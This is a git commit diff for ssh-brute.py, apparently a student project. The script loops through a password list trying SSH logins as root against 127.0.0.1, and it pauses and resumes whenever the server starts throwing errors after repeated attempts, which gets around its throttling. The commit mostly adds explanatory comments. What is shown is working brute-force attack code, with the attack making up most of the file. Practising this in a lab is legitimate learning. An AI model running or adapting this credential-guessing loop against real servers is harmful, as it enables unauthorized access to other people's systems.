b501b2b090f658cc6bbacce14d3012e7c3e0fb91
Abhilasha Jayaswal <50154927+aj842@users.noreply.github.com>
2022-10-11 13:03:43 -0400

    Update ssh-brute.py

--- ssh-brute.py
+++ ssh-brute.py
@@ -1,7 +1,10 @@
+#Project 2
+#Author: Abhilasha Jayaswal
 from pwn import *
 import paramiko
 from tqdm import trange
 
+#localadmin
 host = "127.0.0.1"
 username = "root"
 attempts = 1
@@ -11,6 +14,7 @@ i=0
 while i<len(password_list):
 	password = password_list[i]
 	password = password.strip("\n")
+	#Trying the current password for the user root
 	try:
 		print("[{}] Attempting password: '{}'!".format(attempts, password))
 		response = ssh(host=host, port=22, user=username, password=password, timeout=10)
@@ -19,9 +23,11 @@ while i<len(password_list):
 			response.close()
 			break
 		response.close()
+	#Exception for password not found
 	except paramiko.AuthenticationException:
 		print("[X] Invalid password!")
 		i += 1
+	#The server seemsto throw error after continuous attempts so stoping the attack for some time to let the server refresh
 	except paramiko.SSHException:
 		print("Execution will continue after temporary timeout")
 		for j in trange(10):
